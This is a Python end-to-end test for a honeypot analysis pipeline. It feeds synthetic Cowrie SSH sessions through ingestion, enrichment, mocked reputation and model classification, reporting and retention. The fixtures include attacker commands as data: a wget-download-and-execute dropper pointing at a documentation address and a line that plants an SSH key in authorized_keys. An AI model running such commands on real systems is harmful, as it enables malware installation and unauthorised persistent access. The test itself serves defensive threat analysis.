"""The whole pipeline, end to end, against a real PostgreSQL.

Every other test checks one stage against a schema made by
`Base.metadata.create_all`. This one builds the schema the way production
does, with the Alembic migrations, and then runs a week of synthetic traffic
through every stage in the order the timers run them: ingestion, enrichment,
reputation, hash lookups, the rule engine, the language model by sequence, the
freshness checks, the weekly report and retention.

Stages are driven through their command-line entry points — the same
`main()` the systemd units call — wherever that needs no network. The four
that call an outside service (GeoIP, AbuseIPDB, VirusTotal, Gemini) are driven
through their workers, with the real HTTP clients pointed at a fake transport,
so response parsing is exercised as well. Nothing leaves the machine.

It runs in a schema of its own, created and dropped by the fixture, so it can
share a test database with the other tests without either seeing the other's
rows. Skipped unless `TEST_DATABASE_URL` is set.

Addresses are the documentation ranges of RFC 5737, as everywhere in the tests.
"""

from __future__ import annotations

import json
import os
import re
import uuid
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import httpx
import pytest
from sqlalchemy import create_engine, make_url, text
from sqlalchemy.orm import Session, sessionmaker

TEST_DB = os.getenv("TEST_DATABASE_URL")
pytestmark = pytest.mark.skipif(TEST_DB is None, reason="TEST_DATABASE_URL is not set")

ROOT = Path(__file__).resolve().parent.parent
MINER = "d" * 64

# --- The traffic ----------------------------------------------------------------


def _ts(when: datetime) -> str:
    return when.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def session_events(
    sid: str,
    ip: str,
    start: datetime,
    *,
    logins: tuple[tuple[str, str, bool], ...] = (("root", "admin", True),),
    commands: tuple[str, ...] = (),
    download: tuple[str, str] | None = None,
) -> list[dict[str, Any]]:
    """The Cowrie events of one session, in the order Cowrie writes them."""
    clock = iter(start + timedelta(seconds=i) for i in range(1000))

    def event(eventid: str, **fields: Any) -> dict[str, Any]:
        return {
            "eventid": eventid,
            "timestamp": _ts(next(clock)),
            "session": sid,
            "src_ip": ip,
            "sensor": "sensor-test",
            **fields,
        }

    events = [
        event("cowrie.session.connect", src_port=40000, dst_port=2222, protocol="ssh"),
    ]
    for username, password, ok in logins:
        kind = "cowrie.login.success" if ok else "cowrie.login.failed"
        events.append(event(kind, username=username, password=password))
    for command in commands:
        events.append(event("cowrie.command.input", input=command))
    if download:
        url, sha = download
        events.append(event("cowrie.session.file_download", url=url, shasum=sha))
    events.append(event("cowrie.session.closed", duration=5.0))
    return events


class Traffic:
    """A small, known population spread over three weeks and one old session.

    The report covers `week`. Every count asserted below follows from this
    list, so the expected numbers are written next to the sessions that make
    them.
    """

    UNAME = ("uname -a",)
    DROPPER = (
        "cd /tmp",
        "wget http://198.51.100.200/bins/x86",
        "chmod +x x86",
        "./x86",
    )
    KEYS = (
        "mkdir -p ~/.ssh",
        "echo ssh-ed25519 AAAAexamplekey operator >> ~/.ssh/authorized_keys",
    )
    PROCESSES = ("ps aux",)

    def __init__(self, now: datetime) -> None:
        from honeypot_ai.report.weekly import Week

        self.now = now
        # Two weeks back, so the current week's fresh session can never fall in it.
        self.week = Week.of((now - timedelta(days=14)).date())
        mid = self.week.start + timedelta(days=3, hours=10)
        before = self.week.previous.start + timedelta(days=2, hours=10)

        sessions: list[list[dict[str, Any]]] = []

        # The week before: one session of the same sequence, and one guesser.
        sessions.append(session_events("a0", "203.0.113.10", before, commands=self.UNAME))
        sessions.append(
            session_events("g0", "203.0.113.30", before, logins=(("root", "1234", False),))
        )

        # The week: 4 uname sessions from 4 addresses — the largest campaign,
        # first seen the week before.
        for i in range(4):
            sessions.append(
                session_events(
                    f"a{i + 1}",
                    f"203.0.113.{10 + i}",
                    mid + timedelta(hours=i),
                    commands=self.UNAME,
                )
            )
        # 2 droppers from one address, fetching the same file.
        for i in range(2):
            sessions.append(
                session_events(
                    f"d{i}",
                    "203.0.113.20",
                    mid + timedelta(hours=5 + i),
                    commands=self.DROPPER,
                    download=("http://198.51.100.200/bins/x86", MINER),
                )
            )
        # 1 key planted.
        sessions.append(
            session_events("k0", "203.0.113.21", mid + timedelta(hours=8), commands=self.KEYS)
        )
        # 1 process listing, which the fake model reads differently from the rules.
        sessions.append(
            session_events("p0", "203.0.113.22", mid + timedelta(hours=9), commands=self.PROCESSES)
        )
        # 3 guessers who never got in.
        for i in range(3):
            sessions.append(
                session_events(
                    f"g{i + 1}",
                    "203.0.113.30",
                    mid + timedelta(hours=10 + i),
                    logins=(("admin", "admin", False), ("root", "admin", False)),
                )
            )

        # This week: one fresh session, which keeps the freshness check green.
        sessions.append(
            session_events("f0", "203.0.113.40", now - timedelta(minutes=10), commands=self.UNAME)
        )
        # Over a year ago: retention must remove it and its address.
        sessions.append(
            session_events("old", "203.0.113.250", now - timedelta(days=400), commands=("nproc",))
        )

        self.events = [event for session in sessions for event in session]

    # In the week: 4 + 2 + 1 + 1 + 3.
    SESSIONS = 11
    SESSIONS_BEFORE = 2
    SOURCES = 4 + 1 + 1 + 1 + 1  # 203.0.113.10–13, .20, .21, .22, .30
    WITH_COMMANDS = 8

    def write(self, path: Path) -> Path:
        path.write_text("\n".join(json.dumps(e) for e in self.events) + "\n", encoding="utf-8")
        return path


# --- The outside world, faked at the HTTP boundary ---------------------------


def geo_locator() -> Any:
    """Every address in the traffic resolves; two networks, two countries."""
    from honeypot_ai.enrich.geoip import GeoInfo

    class Locator:
        def lookup(self, ip: str) -> GeoInfo:
            if ip == "203.0.113.30":
                return GeoInfo(
                    country_code="NL", country_name="Netherlands", asn=64500, as_org="Guess Net"
                )
            return GeoInfo(
                country_code="DE", country_name="Germany", asn=64501, as_org="Example Hosting"
            )

    return Locator()


def abuseipdb() -> Any:
    from honeypot_ai.reputation.abuseipdb import AbuseIpdbClient

    def handler(request: httpx.Request) -> httpx.Response:
        ip = request.url.params["ipAddress"]
        return httpx.Response(
            200,
            json={
                "data": {
                    "ipAddress": ip,
                    "isPublic": True,
                    "abuseConfidenceScore": 100 if ip == "203.0.113.20" else 0,
                    "usageType": "Data Center/Web Hosting/Transit",
                    "isp": "Example Hosting",
                    "isTor": False,
                    "totalReports": 9,
                    "numDistinctUsers": 3,
                    "lastReportedAt": None,
                }
            },
        )

    return AbuseIpdbClient(
        api_key="test-key",
        min_interval=0.0,
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )


def virustotal() -> Any:
    from honeypot_ai.malware.virustotal import VirusTotalClient

    def handler(request: httpx.Request) -> httpx.Response:
        assert request.url.path.endswith(MINER), "only the captured hash is ever sent"
        return httpx.Response(
            200,
            json={
                "data": {
                    "id": MINER,
                    "type": "file",
                    "attributes": {
                        "last_analysis_stats": {
                            "malicious": 31,
                            "suspicious": 0,
                            "harmless": 0,
                            "undetected": 30,
                        },
                        "popular_threat_classification": {
                            "suggested_threat_label": "miner.xmrig/coinminer"
                        },
                        "type_description": "ELF",
                        "size": 4096,
                    },
                }
            },
        )

    return VirusTotalClient(
        api_key="test-key",
        min_interval=0.0,
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )


class FakeGemini:
    """Answers like the model would, from the commands in the user prompt.

    It agrees with the rules on everything except `ps aux`, which it calls
    shell probing, so the report has one disagreement to show.
    """

    def __init__(self) -> None:
        self.calls = 0

    def handler(self, request: httpx.Request) -> httpx.Response:
        self.calls += 1
        body = json.loads(request.content)
        prompt = body["contents"][-1]["parts"][0]["text"]
        if "wget" in prompt:
            answer = ("staging", ["payload_download", "payload_execution"])
        elif "authorized_keys" in prompt:
            answer = ("persistence", ["authorized_keys_write"])
        elif "ps aux" in prompt:
            answer = ("shell_probing", ["process_enumeration"])
        elif "uname" in prompt:
            answer = ("fingerprinting", ["host_enumeration"])
        else:
            answer = ("credential_access", [])
        text_reply = json.dumps(
            {
                "intent": answer[0],
                "behaviours": answer[1],
                "operator": "automated",
                "confidence": 0.9,
                "rationale": "test",
            }
        )
        return httpx.Response(
            200,
            json={
                "candidates": [
                    {
                        "content": {"parts": [{"text": text_reply}], "role": "model"},
                        "finishReason": "STOP",
                    }
                ]
            },
        )

    def classifier(self) -> tuple[Any, str]:
        from honeypot_ai.classify.llm.classifier import LlmClassifier
        from honeypot_ai.classify.llm.gemini import GeminiProvider

        provider = GeminiProvider(
            api_key="test-key",
            model="test-model",
            min_interval=0.0,
            client=httpx.Client(transport=httpx.MockTransport(self.handler)),
        )
        return LlmClassifier(provider).classify, provider.name


# --- A database of its own ------------------------------------------------------


@pytest.fixture
def database(monkeypatch: pytest.MonkeyPatch) -> Iterator[sessionmaker[Session]]:
    """An empty schema, made current by the migrations, dropped afterwards.

    `DATABASE_URL` is pointed at it, so every entry point under test connects
    exactly as it would in production, through `database_url()`.
    """
    from honeypot_ai.db.engine import get_engine

    schema = f"e2e_{uuid.uuid4().hex[:12]}"
    admin = create_engine(TEST_DB or "", future=True)
    with admin.begin() as conn:
        conn.execute(text(f'CREATE SCHEMA "{schema}"'))

    url = make_url(TEST_DB or "").update_query_dict({"options": f"-csearch_path={schema}"})
    monkeypatch.setenv("DATABASE_URL", url.render_as_string(hide_password=False))
    get_engine.cache_clear()
    try:
        from alembic import command
        from alembic.config import Config

        config = Config(str(ROOT / "alembic.ini"))
        config.set_main_option("script_location", str(ROOT / "migrations"))
        command.upgrade(config, "head")

        engine = create_engine(url, future=True)
        yield sessionmaker(bind=engine, expire_on_commit=False)
        engine.dispose()
    finally:
        get_engine().dispose()
        get_engine.cache_clear()
        with admin.begin() as conn:
            conn.execute(text(f'DROP SCHEMA "{schema}" CASCADE'))
        admin.dispose()


# --- The test ---------------------------------------------------------------------


def test_the_migrations_build_the_schema_the_code_expects(
    database: sessionmaker[Session],
) -> None:
    """Models and migrations must not drift: the code would then write to
    columns production does not have, and every other test would still pass,
    because they build the schema from the models."""
    from alembic.autogenerate import compare_metadata
    from alembic.migration import MigrationContext

    from honeypot_ai.db import Base

    with database() as db:
        context = MigrationContext.configure(db.connection(), opts={"compare_type": True})
        assert compare_metadata(context, Base.metadata) == []


def test_a_week_of_traffic_goes_through_every_stage(
    database: sessionmaker[Session],
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    from honeypot_ai.classify import __main__ as classify_cli
    from honeypot_ai.classify.worker import classify_by_sequence
    from honeypot_ai.enrich.worker import enrich_pending
    from honeypot_ai.health import __main__ as health_cli
    from honeypot_ai.ingest import __main__ as ingest_cli
    from honeypot_ai.malware.worker import check_pending as check_hashes
    from honeypot_ai.report import __main__ as report_cli
    from honeypot_ai.reputation.worker import check_pending as check_reputation
    from honeypot_ai.retention import __main__ as retention_cli

    traffic = Traffic(datetime.now(UTC))
    log = traffic.write(tmp_path / "cowrie.json")
    total = Traffic.SESSIONS + Traffic.SESSIONS_BEFORE + 2  # plus the fresh and the old

    def run(cli: Any, *argv: str) -> str:
        capsys.readouterr()
        assert cli.main(list(argv)) == 0, capsys.readouterr()
        return capsys.readouterr().out

    # Ingestion, twice: the second run must change nothing.
    assert f"{total} sessions seen, {total} new" in run(ingest_cli, str(log))
    assert f"{total} unchanged" in run(ingest_cli, str(log))

    # Enrichment and the two lookups, through their workers.
    with database() as db:
        enrich_pending(db, geo_locator())
        check_reputation(db, abuseipdb())
        assert check_hashes(db, virustotal()).malicious == 1

    # The rule engine, twice: nothing is pending the second time.
    assert f"{total} labelled" in run(classify_cli, "--classifier", "rules")
    assert "0 sessions pending" in run(classify_cli, "--classifier", "rules")

    # The model, once per distinct sequence; a second run asks nothing.
    gemini = FakeGemini()
    classifier, name = gemini.classifier()
    with database() as db:
        stats = classify_by_sequence(db, classifier, name)
    assert stats.sessions_labelled == total
    distinct = gemini.calls
    assert distinct < total, "sessions sharing a sequence must share one call"
    with database() as db:
        classify_by_sequence(db, classifier, name)
    assert gemini.calls == distinct

    # Freshness: every stage has just written something.
    out = run(health_cli)
    assert out.count("ok") >= 3 and "FAIL" not in out

    # The report.
    run(report_cli, "weekly", "--week", traffic.week.label, "--out-dir", str(tmp_path))
    page = (tmp_path / f"weekly-{traffic.week.label}.md").read_text(encoding="utf-8")

    assert f"# Honeypot weekly report, {traffic.week.label}" in page
    assert f"| Sessions | {Traffic.SESSIONS} | +450% |" in page  # 11 against 2
    assert f"| Source addresses | {Traffic.SOURCES} | |" in page
    assert "| Countries | 2 | |" in page
    assert f"| Sessions that ran commands | {Traffic.WITH_COMMANDS} | |" in page

    assert "| staging | 2 |" in page
    assert "| persistence | 1 |" in page
    assert "| credential_access | 3 |" in page

    assert re.search(r"\[T1105\]\(.*\) Ingress Tool Transfer \| Command and Control \| 2 \|", page)
    assert re.search(r"\[T1098\.004\]\(.*\) SSH Authorized Keys \| .* \| 1 \|", page)
    assert re.search(r"\[T1082\]\(.*\) System Information Discovery \| Discovery \| 4 \|", page)

    first_seen = (traffic.week.previous.start + timedelta(days=2)).date().isoformat()
    assert f"| 4 | 4 | fingerprinting | T1082 | {first_seen} |" in page

    assert "| Germany | 8 |" in page
    assert "| Netherlands | 3 |" in page
    assert "| `root` | `admin` | 11 |" in page  # 8 logins that got in, 3 that did not
    assert "| `admin` | `admin` | 3 |" in page

    assert f"| `{MINER}` | 2 | 31 engines, `miner.xmrig/coinminer` | ELF |" in page

    assert re.search(r"they agree on 10 \(90\.9%\)", page)
    assert "| fingerprinting | shell_probing | 1 |" in page

    # What must never reach a published page.
    for forbidden in ("203.0.113.", "198.51.100.", "wget", "authorized_keys", "ps aux"):
        assert forbidden not in page, forbidden

    # Retention: the year-old session and its address go, nothing else does.
    assert "Deleted: 1 sessions, 1 addresses" in run(retention_cli)
    with database() as db:
        assert db.execute(text("SELECT count(*) FROM sessions")).scalar() == total - 1
        assert db.execute(text("SELECT count(*) FROM session_labels")).scalar() == 2 * (total - 1)
        assert not db.execute(text("SELECT 1 FROM ip_intel WHERE ip = '203.0.113.250'")).first()
